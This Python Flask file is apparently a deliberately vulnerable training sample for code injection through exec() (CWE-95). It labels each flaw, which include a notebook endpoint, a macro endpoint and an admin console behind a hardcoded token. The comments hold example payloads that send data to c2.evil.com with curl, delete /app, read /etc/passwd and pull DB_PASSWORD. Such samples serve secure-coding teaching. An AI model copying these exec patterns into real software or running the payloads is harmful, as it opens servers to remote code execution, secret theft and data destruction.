# VULNERABLE: Code Injection via exec() - Training Sample
# CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
# Severity: CRITICAL
# Description: exec() executes arbitrary Python statements from user-controlled input,
#              providing full access to the Python runtime and underlying OS

import os
from flask import Flask, request, jsonify

app = Flask(__name__)


def run_user_code(code: str):
    """VULNERABLE: exec() on raw user-supplied code string."""
    # VULN: code = "import os; os.system('curl http://c2.evil.com/$(id|base64)')"
    exec(code)


def plugin_loader(plugin_code: str, context: dict):
    """VULNERABLE: Plugin system that exec()s user-provided code."""
    # VULN: plugin_code can define functions that exfiltrate context
    namespace = dict(context)
    exec(plugin_code, namespace)   # VULN: context exposed to plugin
    return namespace


def apply_migration(migration_script: str):
    """VULNERABLE: Database migration applied by exec()'ing a script string."""
    # VULN: migration_script = "import shutil; shutil.rmtree('/app')"
    exec(migration_script, {"__builtins__": __builtins__})


def interactive_shell(command: str, local_vars: dict):
    """VULNERABLE: REPL-like shell feature that exec()s user input."""
    # VULN: any Python statement runs — file I/O, network, subprocess, etc.
    exec(command, {"__builtins__": __builtins__}, local_vars)


@app.route("/notebook/run", methods=["POST"])
def notebook_run():
    """VULNERABLE: Jupyter-style cell execution via exec()."""
    cell_code = request.json.get("code", "")
    output = {}
    try:
        # VULN: full Python environment exposed — os, subprocess, open(), etc.
        exec(cell_code, {"__builtins__": __builtins__}, output)
        return jsonify({"status": "ok", "output": str(output)})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route("/macro/execute", methods=["POST"])
def macro_execute():
    """VULNERABLE: User-defined macro executed server-side."""
    macro = request.form.get("macro", "")
    # VULN: macro = "open('/etc/passwd').read()" leaks system files
    result_ns = {}
    exec(macro, result_ns)
    return jsonify(result_ns)


def deserialize_and_run(serialized_func: str):
    """VULNERABLE: Serialized function string decoded and executed."""
    import base64
    code = base64.b64decode(serialized_func).decode()
    # VULN: base64 encoding is not a security boundary
    exec(code)


def hotpatch(patch_code: str):
    """VULNERABLE: Live code patch applied to running service."""
    # VULN: patch_code can redefine any function or import and call malicious code
    exec(patch_code, globals())


def data_pipeline_step(transform: str, data: list) -> list:
    """VULNERABLE: ETL transform step defined as user-supplied code string."""
    # VULN: transform = "data = [__import__('os').getenv('DB_PASSWORD')]"
    namespace = {"data": data}
    exec(transform, namespace)
    return namespace.get("data", data)


@app.route("/admin/console", methods=["POST"])
def admin_console():
    """VULNERABLE: Admin console with direct Python exec — intended for ops."""
    # VULN: If authorization fails or is bypassed, full RCE is exposed
    token = request.headers.get("X-Admin-Token", "")
    if token != "admin_token_hardcoded":    # also a hardcoded secret
        return jsonify({"error": "unauthorized"}), 403
    cmd = request.json.get("command", "")
    ns = {}
    exec(cmd, ns)                           # VULN: exec on admin input
    return jsonify({"result": str(ns)})


if __name__ == "__main__":
    app.run(debug=True)